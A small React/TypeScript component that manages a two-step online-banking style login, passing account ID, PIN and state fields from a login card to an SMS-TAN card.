"use client";

import { useState } from "react";
import LoginCard from "./LoginCard";
import SmsTanCard from "./SmsTanCard";

export type LoginData = {
  bundesland: string;
  verfueger: string;
  pin: string;
  saveVerfueger: boolean;
};

const initialData: LoginData = {
  bundesland: "",
  verfueger: "",
  pin: "",
  saveVerfueger: false,
};

export default function LoginFlow() {
  const [step, setStep] = useState<"login" | "smsTan">("login");
  const [data, setData] = useState<LoginData>(initialData);

  if (step === "smsTan") {
    return (
      <SmsTanCard
        verfueger={data.verfueger}
        onBack={() => setStep("login")}
      />
    );
  }

  return (
    <LoginCard
      data={data}
      onChange={setData}
      onSubmit={() => setStep("smsTan")}
    />
  );
}
